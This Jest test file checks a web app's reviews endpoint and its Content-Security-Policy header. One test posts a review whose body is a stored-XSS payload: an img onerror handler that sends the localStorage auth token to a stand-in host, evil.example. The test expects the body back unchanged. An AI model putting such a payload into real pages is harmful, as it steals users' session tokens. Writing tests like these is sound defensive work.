import request from 'supertest';
import jwt from 'jsonwebtoken';
import mongoose from 'mongoose';
import app from '../../server/src/app.js';

// The Reviews API test below exercises the route + controller without a real
// database. Using an in-memory store keeps the suite fast and removes the
// mongodb-memory-server binary download (hundreds of MB) from the critical
// path, which is what used to make the first test run time out.
jest.mock('../../server/src/models/Review.js', () => {
  const { Types } = require('mongoose');
  const store = [];

  const query = (result) => ({
    populate() { return this; },
    sort() { return this; },
    lean: async () => result
  });

  return {
    Review: {
      create: jest.fn(async (doc) => {
        const _id = new Types.ObjectId().toString();
        store.push({
          _id,
          ...doc,
          author: { _id: doc.author, name: 'Reviewer' },
          createdAt: new Date().toISOString()
        });
        return { _id };
      }),
      find: jest.fn((filter) =>
        query(store.filter((r) => String(r.listing) === String(filter.listing)))
      ),
      findById: jest.fn((id) =>
        query(store.find((r) => String(r._id) === String(id)) || null)
      )
    }
  };
});

const JWT_SECRET = 'test-secret';

beforeAll(() => {
  process.env.JWT_SECRET = JWT_SECRET;
  process.env.JWT_EXPIRES_IN = '1h';
});

function authToken() {
  return jwt.sign(
    { id: new mongoose.Types.ObjectId().toString(), name: 'Reviewer' },
    JWT_SECRET,
    { expiresIn: '1h' }
  );
}

describe('Reviews API', () => {
  test('a logged-in user can create a review and it can be read back', async () => {
    const token = authToken();
    const listingId = new mongoose.Types.ObjectId().toString();

    const payload =
      'Great seller! <img src=x onerror="fetch(\'//evil.example/?t=\' + localStorage.getItem(\'token\'))">';
    const createRes = await request(app)
      .post('/api/reviews')
      .set('Authorization', `Bearer ${token}`)
      .send({ listing: listingId, rating: 5, body: payload });
    expect(createRes.status).toBe(201);

    const listRes = await request(app).get('/api/reviews').query({ listing: listingId });
    expect(listRes.status).toBe(200);
    expect(listRes.body.reviews).toHaveLength(1);
    expect(listRes.body.reviews[0].body).toBe(payload);
  });
});

describe('Content-Security-Policy header', () => {
  test('responses send a CSP header', async () => {
    const res = await request(app).get('/api/health');
    expect(res.headers['content-security-policy']).toBeDefined();
  });

  test('the CSP restricts scripts to the same origin and blocks inline script', async () => {
    const res = await request(app).get('/api/health');
    const csp = res.headers['content-security-policy'] || '';

    // script-src is present and allows only 'self'
    expect(csp).toMatch(/script-src[^;]*'self'/);
    // and it must NOT permit inline script (which is how injected XSS runs)
    expect(csp).not.toMatch(/script-src[^;]*'unsafe-inline'/);
  });
});
